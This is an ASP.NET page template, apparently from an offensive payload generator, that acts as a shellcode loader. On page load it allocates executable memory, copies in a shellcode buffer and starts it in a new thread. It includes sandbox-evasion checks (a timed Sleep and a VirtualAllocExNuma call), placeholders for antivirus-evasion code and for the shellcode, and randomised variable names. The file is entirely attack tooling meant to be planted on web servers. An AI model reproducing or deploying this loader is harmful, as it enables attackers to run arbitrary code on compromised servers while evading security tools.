<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    private static Int32 MEM_COMMIT=0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();
    
    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern void Sleep(uint dwMilliseconds);
    
    static bool buy_in()
    {
        DateTime t1 = DateTime.Now;
        Sleep(2000);
        double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
        if (t2 < 1.5)
        {
            return false;
        }

        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if (mem == null)
        {
            return false;
        }

        return true;
    }
    
    static void cleaning()
    {
        Console.WriteLine("Do Nothing");
    }

    protected void Page_Load(object sender, EventArgs e)
    {

        !!!_AVEVASION_MARK!!!
        
        !!!_SHELLCODE_MARK!!!

        IntPtr vQgIQp = VirtualAlloc(IntPtr.Zero,(UIntPtr)buf.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(buf,0,vQgIQp,buf.Length);
        IntPtr poh_HeIChXH = IntPtr.Zero;
        IntPtr NuCXSv = CreateThread(IntPtr.Zero,UIntPtr.Zero,vQgIQp,IntPtr.Zero,0,ref poh_HeIChXH);
    }
</script>